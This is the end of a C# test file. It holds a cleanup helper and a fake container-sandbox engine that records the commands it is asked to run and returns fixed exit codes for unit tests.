            Directory.Delete(path, recursive: true);
        }
        catch { /* never fail a test from cleanup */ }
    }

    /// <summary>Reports a fixed container-runtime exit and records what it was asked to run, where.</summary>
    private sealed class FakeSandboxEngine : ISandboxEngine
    {
        private readonly int _exitCode;
        private readonly Func<IReadOnlyList<string>, int>? _exitFor;

        public FakeSandboxEngine(int exitCode, Func<IReadOnlyList<string>, int>? exitFor = null)
        {
            _exitCode = exitCode;
            _exitFor = exitFor;
        }

        public string? LastContainerId { get; private set; }
        public IReadOnlyList<string>? LastCommand { get; private set; }

        /// <summary>EVERY exec, in order — the toolchain presence probes run before the verify command,
        /// so a test that only ever saw the LAST one could not tell which toolchain was probed.</summary>
        public List<IReadOnlyList<string>> Commands { get; } = new();

        public Task<SandboxExecResult> ExecAsync(string containerId, IReadOnlyList<string> command, CancellationToken ct = default)
        {
            LastContainerId = containerId;
            LastCommand = command;
            Commands.Add(command);
            return Task.FromResult(new SandboxExecResult(_exitFor?.Invoke(command) ?? _exitCode, "output", ""));
        }

        public Task<SandboxHandle> SpawnAsync(SandboxSpawnRequest request, CancellationToken ct = default) => throw new NotSupportedException();
        public Task PauseAsync(string containerId, CancellationToken ct = default) => throw new NotSupportedException();
        public Task UnpauseAsync(string containerId, CancellationToken ct = default) => throw new NotSupportedException();
        public Task StopAsync(string containerId, CancellationToken ct = default) => throw new NotSupportedException();
        public Task RemoveAsync(string containerId, CancellationToken ct = default) => throw new NotSupportedException();
    }
}
